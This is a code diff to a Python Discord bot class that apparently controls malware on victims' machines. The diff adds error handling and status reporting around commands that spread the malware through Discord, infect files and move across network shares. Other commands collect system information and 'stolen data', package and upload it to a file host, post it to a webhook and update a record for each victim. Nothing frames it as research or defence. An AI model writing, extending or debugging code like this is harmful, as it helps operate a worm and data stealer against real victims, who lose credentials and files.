@@ -5107,15 +5107,27 @@ class DiscordBotControl:
             try:
                 # Discord spreading
                 await message.channel.send(f"🎮 Executing Discord spread...")
-                await discord_spread()
+                try:
+                    await discord_spread()
+                    await message.channel.send("✅ Discord spreading completed")
+                except Exception as e:
+                    await message.channel.send(f"❌ Discord spreading failed: {str(e)}")
                 
                 # File infection
                 await message.channel.send(f"🦠 Starting file infection...")
-                file_infection()
+                try:
+                    file_infection()
+                    await message.channel.send("✅ File infection completed")
+                except Exception as e:
+                    await message.channel.send(f"❌ File infection failed: {str(e)}")
                 
                 # Network spreading  
                 await message.channel.send(f"🌐 Starting network spread...")
-                network_share_spread()
+                try:
+                    network_share_spread()
+                    await message.channel.send("✅ Network spreading completed")
+                except Exception as e:
+                    await message.channel.send(f"❌ Network spreading failed: {str(e)}")
                 
                 await message.channel.send(f"✅ **Spread operations completed** from {victim_info.get('hostname', 'Unknown')}")
                 self.log_command_execution(victim_id, "FORCE_SPREAD", message.author.name)
@@ -5145,25 +5157,49 @@ class DiscordBotControl:
             # Actually perform data collection
             try:
                 # Collect system information
-                system_info = collect_system_info()
+                await message.channel.send(f"📊 Collecting system information...")
+                try:
+                    system_info = collect_system_info()
+                    await message.channel.send("✅ System information collected")
+                except Exception as e:
+                    await message.channel.send(f"❌ System info collection failed: {str(e)}")
+                    system_info = {}
                 
                 # Collect stolen data summary  
-                stolen_data = collect_stolen_data()
+                await message.channel.send(f"🔍 Collecting stolen data...")
+                try:
+                    stolen_data = collect_stolen_data()
+                    await message.channel.send("✅ Stolen data collected")
+                except Exception as e:
+                    await message.channel.send(f"❌ Stolen data collection failed: {str(e)}")
+                    stolen_data = {}
                 
                 # Create and upload data package
                 await message.channel.send(f"📦 Creating data package...")
-                gofile_url = create_and_upload_data_package(system_info, stolen_data)
-                
-                # Send results
-                if gofile_url:
-                    await message.channel.send(f"✅ **Data Collection Complete!**\n🔗 **Download**: {gofile_url}")
-                    # Also send clean webhook with results
-                    send_clean_webhook(system_info, stolen_data)
-                else:
-                    await message.channel.send(f"⚠️ Data collected but upload failed. Check logs.")
+                try:
+                    gofile_url = create_and_upload_data_package(system_info, stolen_data)
+                    
+                    # Send results
+                    if gofile_url:
+                        await message.channel.send(f"✅ **Data Collection Complete!**\n🔗 **Download**: {gofile_url}")
+                        # Also send clean webhook with results
+                        try:
+                            send_clean_webhook(system_info, stolen_data)
+                            await message.channel.send("✅ Webhook notification sent")
+                        except Exception as e:
+                            await message.channel.send(f"⚠️ Webhook failed: {str(e)}")
+                    else:
+                        await message.channel.send(f"⚠️ Data collected but upload failed. Check logs.")
+                except Exception as e:
+                    await message.channel.send(f"❌ Data package creation failed: {str(e)}")
                 
                 # Update victim status
-                self.update_victim_status(victim_id, stolen_data)
+                try:
+                    self.update_victim_status(victim_id, stolen_data)
+                    await message.channel.send("✅ Victim status updated")
+                except Exception as e:
+                    await message.channel.send(f"❌ Victim status update failed: {str(e)}")
+                
                 self.log_command_execution(victim_id, "FORCE_COLLECT", message.author.name)
                 
             except Exception as collect_error:
